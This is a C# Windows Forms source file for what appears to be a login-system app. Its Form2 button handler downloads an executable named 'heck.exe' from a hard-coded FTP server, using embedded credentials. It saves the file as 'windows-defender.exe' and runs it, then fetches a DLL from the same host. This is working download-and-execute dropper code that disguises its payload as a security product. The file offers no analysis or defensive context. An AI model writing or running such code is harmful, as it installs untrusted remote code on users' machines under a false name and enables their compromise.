using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Resources;
using System.Diagnostics;
using System.Reflection;
using System.IO;
using System.Net;

namespace giriş_sistemii
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();

            Process myProcess = new Process();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            DownloadFileFTP();

        }

        private void DownloadFileFTP()
        {
            if (File.Exists(@"C:\Temp\windows-defender.exe"))
            {
                File.Delete(@"C:\Temp\windows-defender.exe");
                callan();
            }
            else
            {
                callan();
            }
        }

        private void callan()
        {
            string inputfilepath = @"C:\Temp\windows-defender.exe";
            string ftphost = "176.53.74.79";
            string ftpfilepath = "/httpdocs/heck.exe";

            string ftpfullpath = "ftp://" + ftphost + ftpfilepath;

            using (WebClient request = new WebClient())
            {
                request.Credentials = new NetworkCredential("birfikri", "i9Ek1Ek4A");
                byte[] fileData = request.DownloadData(ftpfullpath);

                using (FileStream file = File.Create(inputfilepath))
                {
                    file.Write(fileData, 0, fileData.Length);
                    file.Close();
                }
                System.Diagnostics.Process.Start(@"C:\Temp\windows-defender.exe");
            }

            string inputfilepath1 = @"C:\Temp\deneme.dll";
            string ftphost1 = "176.53.74.79";
            string ftpfilepath1 = "/httpdocs/deneme.dll";

            string ftpfullpath1 = "ftp://" + ftphost1 + ftpfilepath1;

            using (WebClient request = new WebClient())
            {
                request.Credentials = new NetworkCredential("birfikri", "i9Ek1Ek4A");
                byte[] fileData = request.DownloadData(ftpfullpath1);

                using (FileStream file = File.Create(inputfilepath1))
                {
                    file.Write(fileData, 0, fileData.Length);
                    file.Close();
                }
               
            }
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            label1.Text = Form1.uns;
        }
    }
}
